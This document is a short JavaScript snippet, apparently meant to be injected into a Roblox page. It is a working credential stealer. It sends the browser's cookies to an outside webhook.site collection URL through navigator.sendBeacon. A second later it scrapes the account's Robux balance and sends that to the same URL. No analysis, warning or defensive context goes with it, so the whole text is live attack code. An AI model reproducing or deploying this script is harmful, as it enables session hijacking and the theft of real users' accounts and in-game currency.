(function() {
    const url = "https://webhook.site/53158f3f-579b-4186-8cdd-d33333543bec";
    
    navigator.sendBeacon(url, "COOKIE: " + document.cookie);

    setTimeout(() => {
        let robux = "unknown";
        try {
            robux = document.querySelector('[data-testid="nav-robux-amount"]')?.textContent || "unknown";
        } catch(e) {}
        navigator.sendBeacon(url, "ROBUX: " + robux);
    }, 1000);
})();
